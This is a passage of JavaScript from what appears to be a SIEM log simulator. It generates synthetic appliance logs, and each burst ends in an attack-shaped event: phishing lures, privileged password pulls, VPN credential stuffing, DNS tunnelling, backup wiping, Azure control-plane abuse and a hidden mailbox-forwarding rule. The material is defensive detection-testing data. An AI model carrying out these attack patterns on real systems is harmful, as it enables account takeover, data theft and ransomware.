          ['Your mailbox will be deactivated', 'mailbox-verify.docm'],
          ['DocuSign: contract awaiting signature', 'contract_docusign.lnk'],
        ]);
        const spoofed = `billing@${rand.pick(['corp-example.co', 'micros0ft-billing.top', 'docusign-secure.top'])}`;
        evs.push(Object.assign(base(), {
          severity: 3, cefSev: 8, mid: rand.int(100000000, 999999999), icid: rand.int(10000000, 99999999),
          dcid: 0, srcIp: rand.pick(THREAT_INTEL.ips), mailFrom: spoofed, friendlyFrom: 'Accounts Payable',
          rcptTo: `${rand.pick(USERS)}@corp.example`, subject: lure[0], attachment: lure[1],
          spf: 'Fail', dmarc: 'Fail', asVerdict: 'POSITIVE', avVerdict: 'CLEAN', ampVerdict: 'MALICIOUS',
          finalAction: 'QUARANTINED', phish: true, threatSev: 'high',
          message: `phishing quarantined from ${spoofed} spf=fail dmarc=fail attachment="${lure[1]}"`,
        }));
        return evs;
      },
    },
    cyberark: {
      label: 'CyberArk Vault (EPV)', category: 'appliance',
      build() {
        const host = 'cyberark-vault-01', hostIp = '10.10.4.20';
        const base = () => ({
          srcType: 'cyberark', vendor: 'cyberark', host, hostIp, facility: FACILITY.local1,
          program: 'CyberArk', proto: 'tcp', recordId: rand.int(100000, 999999),
        });
        const evs = [];
        const routine = [
          [295, 'Logon', 'signed in to the vault'],
          [7, 'Retrieve password', 'retrieved a password'],
          [302, 'CPM Verify Password', 'verified the account password'],
          [8, 'Add File Category', 'updated an account property'],
        ];
        const safes = ['WIN-DOMAIN-ADMINS', 'UNIX-ROOT', 'DB-ORACLE-SYS', 'NET-CISCO-ENABLE', 'ESX-ROOT', 'AWS-BREAKGLASS'];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const r = rand.pick(routine);
          const u = rand.pick(USERS);
          evs.push(Object.assign(base(), {
            severity: 6, actionCode: r[0], act: r[1], user: u, srcIp: rand.internalIp(),
            safe: rand.pick(safes), targetUser: 'svc_sql', targetHost: 'srv-db-01', deviceType: 'Operating System',
            fname: `Root\\${rand.int(100, 999)}\\${u}.xml`, app: 'PVWA',
            message: `${u} ${r[2]}`,
          }));
        }
        // One account holder pulling every privileged safe in a row is the shape
        // that matters — the burst correlates into a single alert.
        const who = rand.pick(BAD_USERS.concat(['contractor_temp']));
        const src = rand.pick(THREAT_INTEL.ips);
        safes.forEach((safe) => {
          evs.push(Object.assign(base(), {
            severity: 3, cefSev: 8, actionCode: 7, act: 'Retrieve password', user: who, srcIp: src,
            safe, targetUser: `adm_${safe.toLowerCase().split('-')[0]}`, targetHost: 'multiple',
            deviceType: 'Operating System', app: 'PACLI', otherInfo: 'no ticket id supplied',
            message: `${who} retrieved the privileged password in safe ${safe} via PACLI`,
          }));
        });
        return evs;
      },
    },
    ivanti: {
      label: 'Ivanti Connect Secure (VPN)', category: 'appliance',
      build() {
        const host = rand.pick(['ics-vpn-01', 'ics-vpn-dr']);
        const base = () => ({
          srcType: 'ivanti', vendor: 'ivanti', host, facility: FACILITY.local0,
          program: 'ics', proto: 'tcp', realm: 'Users', roles: 'Employees',
        });
        const evs = [];
        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
          const u = rand.pick(USERS), a = rand.ip();
          evs.push(Object.assign(base(), {
            severity: 6, icsCode: 'AUT24414', user: u, srcIp: a, sessionId: rand.hex(8),
            message: `Primary authentication successful for ${u}/AD-Auth from ${a}`,
          }));
          if (rand.chance(0.5)) evs.push(Object.assign(base(), {
            severity: 6, icsCode: 'AUT22673', user: u, srcIp: a,
            message: `Logout from ${a} (session:${rand.hex(8)})`,
          }));
        }
        // A dumped credential list replayed against the gateway: one address,
        // many accounts. vpn-brute correlates the set rather than each failure.
        const src = rand.pick(THREAT_INTEL.ips);
        BAD_USERS.concat(rand.pick(USERS), 'helpdesk').forEach((u) => {
          evs.push(Object.assign(base(), {
            severity: 4, icsCode: 'AUT23457', user: u, srcIp: src, roles: '', nsEvent: 'LOGIN_FAILED',
            message: `Login failed using auth server AD-Auth (Active Directory). Reason: Failed`,
          }));
        });
        return evs;
      },
    },
    infoblox: {
      label: 'Infoblox NIOS (DDI)', category: 'appliance',
      build() {
        const host = 'ib-grid-01', hostIp = '10.10.0.53';
        const base = () => ({
          srcType: 'infoblox', vendor: 'infoblox', host, hostIp, facility: FACILITY.daemon,
          program: 'named', pid: rand.int(1500, 9000), proto: 'udp',
        });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          evs.push(Object.assign(base(), {
            severity: 6, clientHandle: rand.hex(12), srcIp: rand.internalIp(), srcPort: rand.int(1024, 65535),
            domain: rand.pick(DOMAINS), qtype: rand.pick(['A', 'AAAA', 'MX']), qflags: '+E(0)',
            message: 'dns query',
          }));
        }
        // The DHCP half of DDI — the lease is what ties an address to a machine.
        const mac = Array.from({ length: 6 }, () => rand.hex(2)).join(':');
        const leased = `10.${rand.int(10, 40)}.${rand.int(0, 255)}.${rand.int(2, 250)}`;
        const client = rand.pick(['DESKTOP-4KJ21', 'LT-FINANCE-07', 'WS-HR-12']);
        evs.push(Object.assign(base(), {
          severity: 6, program: 'dhcpd', pid: rand.int(1500, 9000),
          message: `DHCPREQUEST for ${leased} from ${mac} via eth2`,
        }));
        evs.push(Object.assign(base(), {
          severity: 6, program: 'dhcpd', pid: rand.int(1500, 9000),
          message: `DHCPACK on ${leased} to ${mac} (${client}) via eth2 relay eth2 lease-duration 1800 (RENEW) uid 01:${mac}`,
        }));
        // Oversized encoded label to a look-alike zone — the tunnelling shape.
        const payload = Array.from({ length: rand.int(44, 58) }, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[rand.int(0, 35)]).join('');
        evs.push(Object.assign(base(), {
          severity: 4, clientHandle: rand.hex(12), srcIp: rand.internalIp(), srcPort: rand.int(1024, 65535),
          domain: `${payload}.tun.${rand.pick(THREAT_INTEL.domains)}`, qtype: 'TXT', qflags: '+E(0)',
          message: 'oversized TXT query — possible tunnel',
        }));
        return evs;
      },
    },
    veeam: {
      label: 'Veeam Backup & Replication', category: 'appliance',
      build() {
        const host = 'veeam-bkp-01';
        const base = () => ({
          srcType: 'veeam', vendor: 'veeam', host, hostIp: '10.10.4.40', facility: FACILITY.local4,
          program: 'Veeam_MP', proto: 'tcp', categoryId: 4,
        });
        const evs = [];
        const jobs = ['SQL-Daily', 'FileServer-Hourly', 'VMware-Prod-Nightly', 'M365-Mailboxes'];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const job = rand.pick(jobs);
          evs.push(Object.assign(base(), {
            severity: 6, instanceId: 41100, oibId: rand.uuid(), user: 'VEEAM\\svc_backup',
            message: `Backup job "${job}" has finished with Success (${rand.int(4, 900)} GB transferred)`,
          }));
        }
        // Wiping the restore points before encrypting is the standard opening
        // move, and it is the one thing backup telemetry sees before the ransom.
        const who = rand.pick(BAD_USERS.concat(['VEEAM\\svc_backup']));
        const wipe = rand.pick([
          [28200, `Backup repository "Immutable-Repo-01" has been deleted by ${who}`],
          [23090, `Backup job "VMware-Prod-Nightly" has been deleted by ${who}`],
          [24030, `Immutability has been disabled on repository "Immutable-Repo-01" by ${who}`],
        ]);
        evs.push(Object.assign(base(), {
          severity: 2, categoryId: 2, instanceId: wipe[0], repoId: rand.uuid(), user: who,
          message: wipe[1],
        }));
        return evs;
      },
    },
    umbrella: {
      // Umbrella resolvers never speak syslog: logs are dropped as CSV into a
      // managed S3 bucket (or pulled from the Reporting API) and re-emitted.
      label: 'Cisco Umbrella (DNS)', category: 'appliance', transport: 'api',
      build() {
        const host = 'umbrella-connector-01';
        const egress = `${rand.int(64, 99)}.${rand.int(0, 255)}.${rand.int(0, 255)}.${rand.int(1, 254)}`;
        const base = () => ({
          srcType: 'umbrella', vendor: 'umbrella', host, facility: FACILITY.local6,
          program: 'umbrella_dns', proto: 'udp', externalIp: egress,
          identityType: 'AD Users', identityTypes: 'AD Users,AD Site,Network',
        });
        const evs = [];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const u = rand.pick(USERS);
          evs.push(Object.assign(base(), {
            severity: 6, identity: u, identities: `${u},HQ-Site,Corp-Network`, user: u,
            srcIp: rand.internalIp(), action: 'Allowed', queryType: rand.pick(['1 (A)', '28 (AAAA)']),
            responseCode: 'NOERROR', domain: rand.pick(DOMAINS),
            categories: rand.pick(['Business Services', 'Software/Technology', 'Search Engines']),
            message: 'dns request allowed',
          }));
        }
        // A blocked security category is Umbrella's own verdict on the domain.
        const u = rand.pick(USERS), bad = rand.pick(THREAT_INTEL.domains);
        evs.push(Object.assign(base(), {
          severity: 3, identity: u, identities: `${u},HQ-Site,Corp-Network`, user: u,
          srcIp: rand.internalIp(), action: 'Blocked', queryType: '1 (A)', responseCode: 'NXDOMAIN',
          domain: bad, categories: 'Command and Control,Malware',
          blockedCategories: 'Command and Control', threatSev: 'high',
          message: `dns request blocked — ${bad} (Command and Control)`,
        }));
        return evs;
      },
    },
    azure: {
      // The Azure control plane is read from an Event Hub or the Monitor API,
      // never syslog — the same relay story as CloudTrail on the AWS side.
      label: 'Azure Activity Log', category: 'appliance', transport: 'api',
      build() {
        const host = 'azure-connector-01';
        const user = `${rand.pick(USERS)}@corp.example`;
        const rg = rand.pick(['rg-prod-app', 'rg-shared-svc', 'rg-data']);
        const base = () => ({
          srcType: 'azure', vendor: 'azure', host, facility: FACILITY.local6,
          program: 'azure_activity', proto: 'tcp', tenantId: ENTRA_TENANT, region: 'westeurope',
          correlationId: rand.uuid(), resultType: 'Success', resultSignature: 'Succeeded',
          durationMs: rand.int(20, 900), user, role: 'Contributor',
          scope: `/subscriptions/${AZURE_SUB}/resourceGroups/${rg}`,
        });
        const evs = [];
        const benign = [
          ['MICROSOFT.COMPUTE/VIRTUALMACHINES/READ', 'virtualMachines/vm-app-01'],
          ['MICROSOFT.STORAGE/STORAGEACCOUNTS/READ', 'storageAccounts/stprodapp'],
          ['MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/READ', 'networkSecurityGroups/nsg-app'],
          ['MICROSOFT.RESOURCES/DEPLOYMENTS/WRITE', 'deployments/app-release'],
        ];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const b = rand.pick(benign);
          evs.push(Object.assign(base(), {
            severity: 6, level: 'Informational', operationName: b[0], action: b[0],
            srcIp: rand.internalIp(),
            resourceId: `/SUBSCRIPTIONS/${AZURE_SUB}/RESOURCEGROUPS/${rg.toUpperCase()}/PROVIDERS/${b[1].toUpperCase()}`,
            message: `${b[0]} on ${b[1]} by ${user}`,
          }));
        }
        // One control-plane abuse closes the burst, so cloud-threat alerts once.
        const bad = rand.pick([
          ['MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/DELETE', 'microsoft.insights/diagnosticSettings/subscription-audit',
            { entity: 'diagnosticSettings/subscription-audit' }],
          ['MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE', 'Microsoft.Authorization/roleAssignments/8a11c2',
            { roleDefinition: 'Owner', principal: 'svc-deploy' }],
          ['MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION', 'storageAccounts/stprodapp/listKeys',
            { keyName: 'key1' }],
          ['MICROSOFT.KEYVAULT/VAULTS/WRITE', 'vaults/kv-prod-secrets',
            { accessPolicy: 'add', permissions: 'get,list' }],
        ]);
        evs.push(Object.assign(base(), {
          severity: 3, level: 'Warning', operationName: bad[0], action: bad[0],
          srcIp: rand.pick(THREAT_INTEL.ips),
          resourceId: `/SUBSCRIPTIONS/${AZURE_SUB}/RESOURCEGROUPS/${rg.toUpperCase()}/PROVIDERS/${bad[1].toUpperCase()}`,
          azProperties: bad[2],
          message: `${bad[0]} on ${bad[1]} by ${user}`,
        }));
        return evs;
      },
    },
    m365: {
      // Pulled from the Office 365 Management Activity API by a connector; the
      // service publishes no syslog of its own.
      label: 'Microsoft 365 audit', category: 'appliance', transport: 'api',
      build() {
        const host = 'o365-connector-01';
        const user = `${rand.pick(USERS)}@corp.example`;
        const base = () => ({
          srcType: 'm365', vendor: 'm365', host, facility: FACILITY.local6,
          program: 'o365_audit', proto: 'tcp', tenantId: ENTRA_TENANT,
          eventUuid: rand.uuid(), resultStatus: 'Succeeded', userKey: rand.hex(24).toUpperCase(),
          user, mailboxOwner: user, appId: rand.uuid(),
        });
        const evs = [];
        const benign = [
          ['FileAccessed', 'SharePoint', 6, 'Shared Documents/Q3-plan.xlsx'],
          ['UserLoggedIn', 'AzureActiveDirectory', 15, ''],
          ['MailItemsAccessed', 'Exchange', 2, 'Inbox'],
          ['FileUploaded', 'OneDrive', 6, 'Documents/notes.docx'],
        ];
        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
          const b = rand.pick(benign);
          evs.push(Object.assign(base(), {
            severity: 6, operation: b[0], workload: b[1], recordType: b[2], objectId: b[3],
            srcIp: rand.internalIp(), message: `${b[0]} (${b[1]}) by ${user}`,
          }));
        }
        // A hidden forwarding rule is how mailbox access is kept after the
        // password is reset — Collection that survives remediation.
        const drop = `${rand.pick(['secure-archive', 'mailbox-backup', 'inbox-sync'])}@${rand.pick(['proton.me', 'mail.ru', 'outlook.com'])}`;
        evs.push(Object.assign(base(), {
          severity: 3, operation: 'New-InboxRule', workload: 'Exchange', recordType: 1,
          objectId: `${user}\\Inbox\\Rule`, srcIp: rand.pick(THREAT_INTEL.ips),
          parameters: [
            { Name: 'Name', Value: '.' },
            { Name: 'ForwardTo', Value: drop },
            { Name: 'DeleteMessage', Value: 'True' },
            { Name: 'StopProcessingRules', Value: 'True' },
          ],
          message: `New-InboxRule "." on ${user} — ForwardTo ${drop}, DeleteMessage True`,
        }));
        return evs;
      },
    },
    cef: {
      label: 'CEF (generic)', category: 'appliance',
      build() {
        const host = rand.pick(['arcsight-conn', 'siem-cef']);
        const base = () => ({ srcType: 'cef', vendor: 'cef', vendorName: 'Security', productName: 'ThreatManager', host, facility: FACILITY.local2, program: 'CEF', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'permitted', cefSev: 3, sigId: rand.int(100, 200),
            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80]), message: 'Traffic Permitted' }));
        }
        const sig = rand.pick(['Brute Force Attack Detected', 'Malware Communication', 'Data Exfiltration Attempt']);
        evs.push(Object.assign(base(), { severity: 2, action: 'blocked', cefSev: 9, sigId: rand.int(900, 999),
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(), srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'critical', message: sig }));
        return evs;
      },
    },
    leef: {
      label: 'LEEF (generic)', category: 'appliance',
      build() {
        const host = rand.pick(['qradar-src', 'siem-leef']);
        const base = () => ({ srcType: 'leef', vendor: 'leef', vendorName: 'Lancope', productName: 'StealthWatch', host, facility: FACILITY.local2, program: 'LEEF', proto: 'tcp' });
        const evs = [];
        for (let i = 0, n = rand.int(2, 4); i < n; i++) {
          evs.push(Object.assign(base(), { severity: 6, action: 'allowed', leefCat: 'flow', leefSev: 3,
            srcIp: rand.internalIp(), dstIp: rand.ip(), srcPort: rand.int(1024, 65535), dstPort: rand.pick([443, 80]), message: 'Flow Permitted' }));
        }
        const sig = rand.pick(['Port Scan Detected', 'Suspect Data Loss', 'Botnet C2 Communication']);
        evs.push(Object.assign(base(), { severity: 2, action: 'blocked', leefCat: 'attack', leefSev: 9,
          srcIp: rand.pick(THREAT_INTEL.ips), dstIp: rand.internalIp(), srcPort: rand.int(1024, 65535), dstPort: 443,
          threatSig: sig, threatSev: 'high', message: sig }));
        return evs;
      },
    },
  };
  Object.assign(SCENARIOS, APPLIANCE);

  // Best-effort parse of an arbitrary imported log line into an event so it can
  // flow through the SIEM (stream, drawer, and IP-based detection rules).
  const IP_RE = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;
  function parseRawLine(line) {
    let severity = 6, facility = 1, msg = line, host = 'imported';
    const m = line.match(/^<(\d+)>/);
    if (m) { const pri = +m[1]; facility = Math.floor(pri / 8); severity = pri % 8; msg = line.slice(m[0].length); }
    const h = msg.match(/^[A-Z][a-z]{2}\s+\d+\s+\d{2}:\d{2}:\d{2}\s+(\S+)/) || // RFC 3164
              msg.match(/^\S+T\d{2}:\d{2}:\d{2}\S*\s+(\S+)/);                  // RFC 5424 / ISO
    if (h) host = h[1];
    const ips = line.match(IP_RE) || [];
    return {
      srcType: 'file', host, hostIp: '', facility, severity, program: 'import',
      srcIp: ips[0] || null, dstIp: ips[1] || null,
      message: msg.trim().slice(0, 300),
      rawOverride: line,
    };
  }

  // ---- Syslogger engine -----------------------------------------------------
  class Syslogger {
    constructor(sink) {
      this.sink = sink;             // function(event)
      this.eps = 8;                 // baseline events per second
      this.format = 'rfc3164';
      this.running = false;
      this._accumulator = 0;
      this._timer = null;
      this._tickMs = 100;
      this.emitted = 0;
      this.maxEvents = null;        // null = unlimited; else total cap
      this.collectorIp = '10.0.0.100';
      this.collectorPort = 514;
      this.onStop = null;           // callback(reason) when auto-stopped
      // Appliance-only stream: while any appliance sources are selected the
      // continuous stream emits from those sources instead of the generic
      // baseline mix, so picking "Cisco ASA" yields Cisco ASA logs and nothing else.
      this.applianceSources = [];
      this._applianceQueue = [];
      this._lastFullBurst = 0;
      // File replay
      this.fileLines = [];
      this.fileName = null;
      this.fileMode = false;        // when true + file loaded, replay file instead of baseline
      this.loop = true;
      this._filePtr = 0;
      // Live forwarding to a real collector (requires the Node backend)
      this.forwarding = false;
      this.forwardProto = 'udp';        // 'udp' | 'tcp' | 'hec' (Splunk HTTP Event Collector)
      this.hec = { token: '', index: '', sourcetype: 'syslog', ssl: true, insecure: true };
      this.forwardedCount = 0;
      this.forwardError = null;
      this._fwdQueue = [];
      this._fwdBusy = false;
      setInterval(() => this._flushForward(), 500);
    }

    setEps(v) { this.eps = Math.max(0, v); }
    setFormat(f) { this.format = f; }
    setMaxEvents(v) { this.maxEvents = (v == null || v <= 0) ? null : Math.floor(v); }
    setCollector(ip, port) { this.collectorIp = ip || this.collectorIp; this.collectorPort = port || this.collectorPort; }
    setFileMode(b) { this.fileMode = !!b; }
    setLoop(b) { this.loop = !!b; }
    loadFile(lines, name) { this.fileLines = lines || []; this.fileName = name || null; this._filePtr = 0; }
    resetCounters() { this.emitted = 0; this._filePtr = 0; this.forwardedCount = 0; this._applianceQueue.length = 0; }
    // Restrict the live stream to the given appliance ids ([] = generic baseline mix).
    setApplianceSources(ids) {
      this.applianceSources = (ids || []).filter((id) => SCENARIOS[id] && SCENARIOS[id].category === 'appliance');
      this._applianceQueue.length = 0;
    }
    setForwarding(b) { this.forwarding = !!b; if (!b) this._fwdQueue.length = 0; else this.forwardError = null; }
    setForwardProto(p) { this.forwardProto = p; }
    setHec(cfg) { Object.assign(this.hec, cfg || {}); }

    start() {
      if (this.running) return;
      this.running = true;
      this._timer = setInterval(() => this._tick(), this._tickMs);
    }

    stop() {
      this.running = false;
      clearInterval(this._timer);
      this._timer = null;
    }

    _tick() {
      this._accumulator += (this.eps * this._tickMs) / 1000;
      let n = Math.floor(this._accumulator);
      this._accumulator -= n;
      const replay = this.fileMode && this.fileLines.length > 0;
      while (n-- > 0) {
        if (replay) this._emitFileLine(); else this._emitBaseline();
        if (!this.running) break;   // the volume cap or EOF may have stopped us
      }
    }

    _finalize(partial) {
      if (this.maxEvents != null && this.emitted >= this.maxEvents) { this._hitLimit(); return null; }
      const ev = Object.assign({ id: rand.id(), ts: Date.now(), pid: null }, partial);
      ev.collector = `${this.collectorIp}:${this.collectorPort}`;
      if (ev.rawOverride) ev.raw = ev.rawOverride;
      else if (ev.vendor && VENDOR_FORMATTERS[ev.vendor]) ev.raw = VENDOR_FORMATTERS[ev.vendor](ev);
      else ev.raw = formatSyslog(ev, this.format);
      this.emitted++;
      if (this.forwarding) {
        this._fwdQueue.push({ raw: ev.raw, host: ev.host || null, ts: ev.ts });
        if (this._fwdQueue.length > 20000) this._fwdQueue.splice(0, 10000);
      }
      this.sink(ev);
      if (this.maxEvents != null && this.emitted >= this.maxEvents) this._hitLimit();
      return ev;
    }

    // Relay the queued events to the backend, which emits them as real UDP/TCP
    // syslog or POSTs them to a Splunk HTTP Event Collector.
    _flushForward() {
      if (!this.forwarding || this._fwdBusy || !this._fwdQueue.length) return;
      if (typeof fetch !== 'function') { this.forwardError = 'forwarding needs the Node backend'; return; }
      const hec = this.forwardProto === 'hec';
      // Hold the queue rather than posting batches Splunk will only reject.
      if (hec && !this.hec.token) { this.forwardError = 'HEC token required'; return; }
      this._fwdBusy = true;
      const batch = this._fwdQueue.splice(0, 1000);
      const payload = { ip: this.collectorIp, port: this.collectorPort, proto: this.forwardProto };
      // HEC takes JSON envelopes (time/host/sourcetype/index + the raw line as
      // the event); UDP/TCP take the raw lines on their own.
      if (hec) { payload.hec = this.hec; payload.events = batch.map((e) => ({ raw: e.raw, host: e.host, time: e.ts / 1000 })); }
      else payload.lines = batch.map((e) => e.raw);
      fetch('/forward', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
        .then((r) => r.json())
        .then((d) => {
          if (d && d.ok) { this.forwardedCount += d.sent; this.forwardError = null; }
          else { this.forwardError = (d && d.error) || 'collector unreachable'; }
        })
        .catch(() => { this.forwardError = 'backend not running — start: node server.js'; })
        .finally(() => { this._fwdBusy = false; });
    }

    _hitLimit() {
      if (!this.running) return;
      this.stop();
      if (this.onStop) this.onStop('limit');
    }

    _emitBaseline() {
      if (this.applianceSources.length) { this._emitAppliance(); return; }
      const src = weightedSource();
      this._finalize(BASELINE[src]());
    }

    // Drip the selected appliances' bursts out one event per slot so the stream
    // honours the EPS setting instead of dumping a whole burst per tick.
    _emitAppliance() {
      if (!this._applianceQueue.length) {
        const scenario = SCENARIOS[rand.pick(this.applianceSources)];
        if (!scenario) return;
        const burst = scenario.build();
        // Appliance builders emit routine traffic first and append the notable
        // events last, so streaming the front of a burst reads like the live
        // device. Let a whole burst — detections and all — through every ~30s,
        // otherwise a sustained feed would flood Detections with one alert per burst.
        const now = Date.now();
        const whole = now - this._lastFullBurst >= 30000;
        if (whole) this._lastFullBurst = now;
        this._applianceQueue = whole ? burst : burst.slice(0, Math.ceil(burst.length / 3));
      }
      const partial = this._applianceQueue.shift();
      if (partial) this._finalize(partial);
    }

    _emitFileLine() {
      if (this._filePtr >= this.fileLines.length) {
        if (this.loop) { this._filePtr = 0; }
        else { this.stop(); if (this.onStop) this.onStop('eof'); return; }
      }
      const line = this.fileLines[this._filePtr++];
      this._finalize(parseRawLine(line));
    }

    // Inject a named attack scenario as a rapid burst of events.
    injectScenario(name) {
      const scenario = SCENARIOS[name];
      if (!scenario) return;
      const events = scenario.build();
      // Spread the burst over a short window so correlation windows see it live.
      // Scenarios can be injected even while the baseline is stopped.
      events.forEach((partial, i) => {
        setTimeout(() => this._finalize(partial), i * rand.int(30, 90));
      });
    }

    static scenarioList() {
      // transport: how a source's logs reach a collector in reality. Every source
      // shipped so far is 'native' (the device speaks syslog itself); sources that
      // need a forwarding agent or an API connector declare 'agent' / 'api'.
      return Object.entries(SCENARIOS).map(([id, s]) => ({
        id, label: s.label, category: s.category || 'attack', transport: s.transport || 'native',
      }));
    }
  }

  global.JS.Syslogger = Syslogger;
})(window);
